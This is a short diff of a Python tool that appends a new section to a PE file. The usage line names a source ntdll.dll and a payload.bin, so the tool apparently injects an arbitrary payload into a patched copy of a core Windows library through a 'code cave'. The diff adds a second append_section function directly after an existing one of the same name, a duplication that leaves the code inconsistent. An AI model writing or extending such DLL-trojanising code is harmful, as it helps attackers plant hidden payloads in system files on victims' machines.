@@ -51,6 +51,19 @@ def append_section(pe, d, r):
     return raw
 
 
+def append_section(pe, d, r):
+    import struct
+    raw = r['rawOffset']
+    e = struct.unpack_from('<I', d, 0x3c)[0]
+    d[pe.table_end:pe.table_end + 40] = struct.pack(
+        '<8sIIIIIIHHI', SECTION_NAME, SECTION_SIZE, r['caveRVA'], SECTION_SIZE, raw,
+        0, 0, 0, 0, SECTION_FLAGS)
+    struct.pack_into('<H', d, e + 6, struct.unpack_from('<H', d, e + 6)[0] + 1)
+    struct.pack_into('<I', d, pe.opt + 56, r['caveRVA'] + SECTION_SIZE)
+    d.extend(b"\0" * (raw + SECTION_SIZE - len(d)))
+    return raw
+
+
 def main():
     if len(sys.argv) < 2:
         raise SystemExit(f"usage: {sys.argv[0]} <src ntdll.dll> [dst] [payload.bin]")
